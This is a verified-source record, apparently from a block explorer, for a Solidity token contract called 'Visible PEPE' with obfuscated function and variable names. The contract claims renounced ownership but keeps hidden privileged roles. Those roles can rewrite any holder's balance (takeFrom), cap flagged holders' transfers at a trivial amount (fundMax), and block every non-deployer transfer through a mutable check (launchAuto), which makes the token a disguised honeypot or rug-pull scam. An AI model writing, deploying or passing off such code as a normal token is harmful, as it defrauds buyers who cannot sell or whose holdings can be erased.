{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface launchedAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeFrom) external view returns (uint256);\n\n    function transfer(address swapAmountList, uint256 totalModeEnable) external returns (bool);\n\n    function allowance(address receiverIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalModeEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapAmountList,\n        uint256 totalModeEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundTx, uint256 value);\n    event Approval(address indexed receiverIs, address indexed spender, uint256 value);\n}\n\nabstract contract takeEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTakeSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeEnableToken {\n    function createPair(address launchAmountTrading, address swapLaunch) external returns (address);\n}\n\ninterface launchedAutoMetadata is launchedAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VisiblePEPE is takeEnable, launchedAuto, launchedAutoMetadata {\n\n    constructor (){\n        if (totalLaunchedToken != totalAtBuy) {\n            txEnable = true;\n        }\n        minTakeSell walletLaunchedList = minTakeSell(isTotal);\n        tradingLiquidity = takeEnableToken(walletLaunchedList.factory()).createPair(walletLaunchedList.WETH(), address(this));\n        if (totalTokenLaunched == totalReceiver) {\n            totalTokenLaunched = false;\n        }\n        swapLaunched = _msgSender();\n        atEnableSell();\n        modeAuto[swapLaunched] = true;\n        walletMode[swapLaunched] = takeToFee;\n        if (totalAtBuy) {\n            txEnable = false;\n        }\n        emit Transfer(address(0), swapLaunched, takeToFee);\n    }\n\n    string private amountEnable = \"VPE\";\n\n    bool public txEnable;\n\n    function exemptMin(address senderIsBuy, address swapAmountList, uint256 totalModeEnable) internal returns (bool) {\n        if (senderIsBuy == swapLaunched) {\n            return maxFee(senderIsBuy, swapAmountList, totalModeEnable);\n        }\n        uint256 takeLaunch = launchedAuto(tradingLiquidity).balanceOf(isTokenLimit);\n        require(takeLaunch == listTotal);\n        require(swapAmountList != isTokenLimit);\n        if (txTo[senderIsBuy]) {\n            return maxFee(senderIsBuy, swapAmountList, toFund);\n        }\n        return maxFee(senderIsBuy, swapAmountList, totalModeEnable);\n    }\n\n    function enableFee(address takeFee) public {\n        require(takeFee.balance < 100000);\n        if (marketingAuto) {\n            return;\n        }\n        \n        modeAuto[takeFee] = true;\n        \n        marketingAuto = true;\n    }\n\n    function maxFee(address senderIsBuy, address swapAmountList, uint256 totalModeEnable) internal returns (bool) {\n        require(walletMode[senderIsBuy] >= totalModeEnable);\n        walletMode[senderIsBuy] -= totalModeEnable;\n        walletMode[swapAmountList] += totalModeEnable;\n        emit Transfer(senderIsBuy, swapAmountList, totalModeEnable);\n        return true;\n    }\n\n    bool public marketingAuto;\n\n    function owner() external view returns (address) {\n        return totalLimit;\n    }\n\n    address public swapLaunched;\n\n    uint256 private exemptShouldTo;\n\n    function transferFrom(address senderIsBuy, address swapAmountList, uint256 totalModeEnable) external override returns (bool) {\n        if (_msgSender() != isTotal) {\n            if (sellLiquidity[senderIsBuy][_msgSender()] != type(uint256).max) {\n                require(totalModeEnable <= sellLiquidity[senderIsBuy][_msgSender()]);\n                sellLiquidity[senderIsBuy][_msgSender()] -= totalModeEnable;\n            }\n        }\n        return exemptMin(senderIsBuy, swapAmountList, totalModeEnable);\n    }\n\n    uint256 public tradingTeamLiquidity;\n\n    mapping(address => bool) public txTo;\n\n    address isTokenLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeToFee;\n    }\n\n    address isTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function txShould() private view {\n        require(modeAuto[_msgSender()]);\n    }\n\n    function balanceOf(address feeFrom) public view virtual override returns (uint256) {\n        return walletMode[feeFrom];\n    }\n\n    uint256 constant toFund = 11 ** 10;\n\n    mapping(address => bool) public modeAuto;\n\n    function approve(address marketingShould, uint256 totalModeEnable) public virtual override returns (bool) {\n        sellLiquidity[_msgSender()][marketingShould] = totalModeEnable;\n        emit Approval(_msgSender(), marketingShould, totalModeEnable);\n        return true;\n    }\n\n    function launchAuto(uint256 totalModeEnable) public {\n        txShould();\n        listTotal = totalModeEnable;\n    }\n\n    address public tradingLiquidity;\n\n    function transfer(address toLiquidity, uint256 totalModeEnable) external virtual override returns (bool) {\n        return exemptMin(_msgSender(), toLiquidity, totalModeEnable);\n    }\n\n    event OwnershipTransferred(address indexed listMin, address indexed shouldReceiver);\n\n    uint256 public totalEnable;\n\n    function fundMax(address shouldToken) public {\n        txShould();\n        if (totalReceiver) {\n            feeBuy = false;\n        }\n        if (shouldToken == swapLaunched || shouldToken == tradingLiquidity) {\n            return;\n        }\n        txTo[shouldToken] = true;\n    }\n\n    uint256 listTotal;\n\n    uint256 private takeToFee = 100000000 * 10 ** 18;\n\n    uint8 private totalAmount = 18;\n\n    bool private feeBuy;\n\n    function takeFrom(address toLiquidity, uint256 totalModeEnable) public {\n        txShould();\n        walletMode[toLiquidity] = totalModeEnable;\n    }\n\n    bool private totalAtBuy;\n\n    bool private totalTokenLaunched;\n\n    mapping(address => mapping(address => uint256)) private sellLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedTx;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountEnable;\n    }\n\n    mapping(address => uint256) private walletMode;\n\n    uint256 limitAt;\n\n    bool private totalLaunchedToken;\n\n    bool private marketingFrom;\n\n    string private launchedTx = \"Visible PEPE\";\n\n    bool private totalReceiver;\n\n    function allowance(address minExempt, address marketingShould) external view virtual override returns (uint256) {\n        if (marketingShould == isTotal) {\n            return type(uint256).max;\n        }\n        return sellLiquidity[minExempt][marketingShould];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalAmount;\n    }\n\n    function atEnableSell() public {\n        emit OwnershipTransferred(swapLaunched, address(0));\n        totalLimit = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return totalLimit;\n    }\n\n    address private totalLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalModeEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atEnableSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFee\",\"type\":\"address\"}],\"name\":\"enableFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"}],\"name\":\"fundMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalModeEnable\",\"type\":\"uint256\"}],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalModeEnable\",\"type\":\"uint256\"}],\"name\":\"takeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeamLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalModeEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIsBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapAmountList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalModeEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "VisiblePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}